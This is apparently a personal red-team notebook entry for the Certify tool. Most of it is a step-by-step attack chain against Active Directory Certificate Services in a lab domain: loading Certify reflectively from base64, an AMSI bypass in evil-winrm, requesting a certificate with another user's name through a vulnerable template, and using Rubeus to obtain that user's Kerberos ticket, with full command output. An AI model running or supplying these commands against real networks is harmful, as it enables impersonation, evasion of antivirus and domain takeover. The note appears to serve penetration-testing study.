---
creation date: September 24th 2022
last modified date: September 24th 2022
aliases: []
tags: #🧰
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #🧰  

# [[Certify]]  
___

## Description:
Find Certificate Authorities (CA's) and vulnerable templates with [Certify](https://github.com/GhostPack/Certify) 

## Installation

Run certify with through PowerShell
Run this to get base64 of certify (can run `pwsh` to do it in kali):

```
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\Certify.exe")) | Out-File -Encoding ASCII C:\Temp\Certify.txt
```

create .ps1 script with the following:
```
$CertifyAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String("aa..."))
[Certify.Program]::Main("find /vulnerable /outfile:C:\Users\e.black\Documents\FILE.txt".Split())
```
Use evil winrm bypass and run the powershell
In evil winrm shell:
```
Bypass-4MSI
./certify.ps1
```

## Commands
Find Certificate Authorities (CA's):
`Certify.exe cas

Find vulnerable templates (the context of who you are running as matters):

```
beacon> getuid
[*] You are CYBER\iyates

beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
```

Look for: 

**ENROLLEE_SUPPLIES_SUBJECT**, which allows the certificate requestor to provide a SAN (subject alternative name).

The certificate usage has **Client Authentication** set.

Domain Users have enrolment rights, so any domain user may request a certificate from this template

If a principal you control had WriteOwner, WriteDacl or WriteProperty, then this could also be abused.


Use the templete to request a certificate as another user:
```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-1.cyberbotic.io\ca-1 /template:VulnerableUserTemplate /altname:nglover

[*] Action: Request a Certificates

[*] Current user context    : CYBER\iyates
[*] No subject name specified, using current context as subject.

[*] Template                : VulnerableUserTemplate
[*] Subject                 : CN=Isabel Yates, CN=Users, DC=cyberbotic, DC=io
[*] AltName                 : nglover

[*] Certificate Authority   : dc-1.cyberbotic.io\ca-1

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 4

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA7+QJhT7SgrP2SLWI7JqilriLBFjGRgob7sK6Gt8/EN4ODCqA
[...snip...]
EZCgtNFHJpynmPVNEcocncFPtV1hskXIElcwer/EdIROOW+qZhan
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGKzCCBROgAwIBAgITIQAAAAJ1qRjA3m3TOAAAAAAAAjANBgkqhkiG9w0BAQsF
[...snip...]
Xm58FnNpAvwXQi1Vu+xIdtpRSGsnl6T6/TYwJlhKqMEU9mRfgaWXgLS+HdS++aw=
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Copy the whole certificate (including the private key) and save it to `cert.pem` on the Kali VM.  Then use the `openssl` command to convert it into pfx format.  You may enter a password (recommended) or leave it blank.

```
root@kali:~# openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:
```

Convert `cert.pfx` into a base64 encoded string:  `cat cert.pfx | base64 -w 0` and use `Rubeus asktgt` to request a TGT using this certificate.
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:nglover /certificate:MIIM5wIBAz[...snip...]dPAgIIAA== /password:password /nowrap

[*] Action: Ask TGT

[*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=Isabel Yates, CN=Users, DC=cyberbotic, DC=io 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'cyberbotic.io\nglover'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGNjCCB[...snip...]pYy5pbw==

  ServiceName              :  krbtgt/cyberbotic.io
  ServiceRealm             :  CYBERBOTIC.IO
  UserName                 :  nglover
  UserRealm                :  CYBERBOTIC.IO
  StartTime                :  1/18/2022 4:38:26 PM
  EndTime                  :  1/19/2022 2:38:26 AM
  RenewTill                :  1/25/2022 4:38:26 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  unJ966veiMXllOu4n88hvAcX/6j71To9JJU5Ec48Pds=
  ASREP (key)              :  6F8361B5177CCC416E67A297C9D61AC975DEAA9E0505DE86657F16EAE9AD8F72
```

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 24th 2022 (02:50 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
